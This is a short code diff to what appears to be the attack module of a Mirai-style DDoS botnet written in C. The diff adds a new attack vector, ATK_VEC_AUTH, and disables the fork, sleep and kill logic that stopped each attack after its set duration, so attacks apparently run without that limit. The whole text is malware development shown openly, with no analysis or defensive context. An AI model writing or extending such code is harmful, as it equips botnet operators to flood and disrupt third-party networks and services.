@@ -38,6 +38,8 @@ BOOL attack_init(void)
     //add_attack(ATK_VEC_PROXY, (ATTACK_FUNC)attack_app_proxy);
     add_attack(ATK_VEC_HTTP, (ATTACK_FUNC)attack_app_http);
 
+    add_attack(ATK_VEC_AUTH, (ATTACK_FUNC)attack_auth_auth);
+
     return TRUE;
 }
 
@@ -156,18 +158,22 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
 {
     int pid1, pid2;
 
-    pid1 = fork();
-    if (pid1 == -1 || pid1 > 0)
-        return;
+    // pid1 = fork();
+    // if (pid1 == -1 || pid1 > 0)
+    //     return;
 
-    pid2 = fork();
-    if (pid2 == -1)
-        exit(0);
-    else if (pid2 == 0)
+    // pid2 = fork();
+    // if (pid2 == -1)
+    //     exit(0);
+    // else if (pid2 == 0)
+    // {
+    //     sleep(duration);
+    //     kill(getppid(), 9);
+    //     exit(0);
+    // }
+    if (FALSE)
     {
-        sleep(duration);
-        kill(getppid(), 9);
-        exit(0);
+
     }
     else
     {
